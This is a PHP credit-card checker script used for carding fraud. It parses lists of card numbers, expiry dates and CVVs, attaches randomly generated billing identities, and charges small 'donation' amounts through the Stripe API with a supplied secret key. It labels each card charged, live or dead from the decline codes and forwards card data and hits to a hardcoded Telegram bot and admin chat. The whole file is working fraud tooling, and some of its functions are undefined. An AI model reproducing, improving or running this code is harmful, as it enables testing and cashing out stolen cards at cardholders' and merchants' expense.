<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
class Person {
    public $fname;
    public $lname;
    public $email;
    public $zip;
    public $add1;
    public $city;
    public $state;
    public $country;

    function __construct() {
        $url = "https://random-data-api.com/api/users/random_user";
        $response = file_get_contents($url);
        $data = json_decode($response, true);
        $this->fname = $data["first_name"];
        $this->lname = $data["last_name"];
        $this->email = $data["email"];
        $this->zip = $data["address"]["zip_code"];
        $this->add1 = $data["address"]["street_address"];
        $this->city = $data["address"]["city"];
        $this->state = $data["address"]["state"];
        $this->country = $data["address"]["country"];
    }
}
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$userid = $_GET['tgm'];
$admin = '-1001920617598';

function send_message($userid, $msg) {
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot5822018970:AAGNPZ81-smJRaGYoDU6vC10zR-tEmCt5W0/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
file_get_contents("https://api.telegram.org/bot5822018970:AAGNPZ81-smJRaGYoDU6vC10zR-tEmCt5W0/sendMessage?chat_id=$admin&text=$text&parse_mode=HTML");

};


if(isset($_GET['cst'])){

$amt = $_GET['cst'];
}
if(empty($amt)) {
    $amt = '1';
}
$chr = $amt * 100;
$prev = $chr -10;
$next = $chr +10;
$sk = $_GET['sec'];
$tgid = 'tgm';
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$rand = new Person();
$name = $rand->fname . " " . $rand->lname;
$email = $rand->email;
$add1 = $rand->add1;
$city = $rand->city;
$state = $rand->state;
$zip = $rand->zip;
#-------------------[1st REQ]--------------------#  

$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$name.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$add1.'&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US'); 
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}

#------------------[2nd REQ]--------------------#  

$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.rand($prev , $next).'&currency=usd&payment_method_types[]=card&payment_method='.$tok1.'&confirm=true&off_session=true&use_stripe_sdk=true&description=Custom Donation');  
$result2 = curl_exec($ch);  
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}

//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' ) || strpos($result2, 'succeeded' )){

$resp = "#CHARGED CC: $lista <br>
➜ Result: $$amt CCN Charged ✅ <br>
➜ Receipt: <a href=$receipturl>Here</a> <br>
";


$hit_resp = "CODESLAYER 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️️

𝗖𝗖: <code>$lista</code>
𝗥𝗘𝗦𝗨𝗟𝗧: <b>CCN Charged $amt$ 🔥</b>
𝗥𝗘𝗖𝗘𝗜𝗣𝗧 𝗨𝗥𝗟: <a href='$receipturl'>Here</a>
";
hit_forward($userid , $admin);

$mtc_resp = "CODESLAYER 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️️

𝗖𝗖: <code>$lista</code>
𝗥𝗘𝗦𝗨𝗟𝗧: <b>CCN Charged $amt$ 🔥</b>
𝗥𝗘𝗖𝗘𝗜𝗣𝗧 𝗨𝗥𝗟: <a href='$receipturl'>Here</a>";
send($mtc_resp);
}

elseif(strpos($result2,'"cvc_check": "pass"')){

$resp = "#LIVE CC: $lista <br>
Result: CVV LIVE <br>
";
}
elseif(strpos($result1, "generic_decline")) {

    $resp = "#DIE CC: $lista <br>
    Result: GENERIC DECLINED <br>
   ";
}
elseif(strpos($result2, "generic_decline")) {
    $resp = "#DIE CC: $lista <br>
    Result: GENERIC DECLINED <br>
    ";
}

elseif(strpos($result2, "insufficient_funds" )) {

$resp = "#LIVE CC: $lista <br>
Result: INSUFFICIENT FUNDS <br>
";
}

elseif(strpos($result2, "fraudulent" )) {
    $resp = "#DIE CC: $lista <br>
    Result: FRAUDULENT<br>
    ";
}
elseif(strpos($result2, "do_not_honor" )) {
    $resp = "#DIE CC: $lista <br>
    Result: DO NOT HONOR <br>
    ";
}
elseif(strpos($result2,'"code": "incorrect_cvc"')){

$resp = "#LIVE CC: $lista <br>
Result: SECURITY CODE IS INCORRECT <br>
";
}
elseif(strpos($result2,' "code": "invalid_cvc"')){

    $resp = "#LIVE CC: $lista <br>
    Result: SECURITY CODE IS INCORRECT <br>
    ";
}
elseif(strpos($result2,"invalid_expiry_month")){
    $resp = "#DIE CC: $lista <br>
    Result: INVALID EXPIRY MONTH <br>
    ";
}
elseif(strpos($result2,"invalid_account")){
    $resp = "#DIE CC: $lista <br>
    Result: INVALID ACCOUNT <br>
    ";
}
elseif(strpos($result2, "lost_card" )) {
    $resp = "#DIE CC: $lista <br>
    Result: LOST CARD <br>
    ";
}
elseif(strpos($result2, "stolen_card" )) {
    $resp = "#DIE CC: $lista <br>
    Result: STOLEN CARD <br>
    ";
}
elseif(strpos($result2, "transaction_not_allowed" )) {

    $resp = "#LIVE CC: $lista <br>
    Result: TRANSACTION NOT ALLOWED <br>
    ";
}
elseif(strpos($result2, "card_error_authentication_required")) {
    $resp = "#LIVE CC: $lista <br>
    Result: 32DS REQUIRED <br>
    ";
}
elseif(strpos($result2, "pickup_card" )) {
    $resp = "#DIE CC: $lista <br>
    Result: PICKUP CARD <br>
    ";
}
elseif(strpos($result2, 'Your card has expired.')) {
    $resp = "#DIE CC: $lista <br>
    Result: EXPIRED CARD <br>
    ";
}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
    $resp = "#DIE CC: $lista <br>
    Result: CARD DECLINE RATE LIMIT EXCEEDED <br>
    ";
}
elseif(strpos($result2, '"code": "processing_error"')) {
    $resp = "#DIE CC: $lista <br>
    Result: PROCESSING ERROR <br>
    ";
}
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    $resp = "#DIE CC: $lista <br>
    Result: INCORRECT CARD NUMBER <br>
    ";
}
elseif(strpos($result2, "incorrect_number")) {
    $resp = "#DIE CC: $lista <br>
    Result: INCORRECT CARD NUMBER <br>
    ";
}
elseif(strpos($result2, 'Your card was declined.')) {
    $resp = "#DIE CC: $lista <br>
    Result: GENERIC DECLINED <br>
    ";
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    $resp = "#DIE CC: $lista <br>
    Result: CVC CHECK UNCHECKED <br>
    ";
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    $resp = "#DIE CC: $lista <br>
    Result: CVC CHECK FAIL <br>
    ";
}
elseif(strpos($result2, "card_not_supported")) {
    $resp = "#DIE CC: $lista <br>
    Result: CARD NOT SUPPORTED <br>
    ";
}
elseif (strpos($result2,'Your card does not support this type of purchase.')) {
    $resp = "#LIVE CC: $lista <br>
    Result: YOUR CARD DOESNT SUPPORT THIS TYPE OF PURCHASE <br>
    ";
}
elseif (strpos($result2, "rate_limit")) {
    $resp = "#DIE CC: $lista <br>
    Result: RATE LIMIT SK <br>
    ";
}
else {
    $resp = "#DIE CC: $lista <br>
    Result: UNKNOWN DECLINED <br>
    Error 1: $result1 <b>
    Error 2: $result2 <b>
    ";
}

echo $resp;
curl_close($ch);
ob_flush();
?>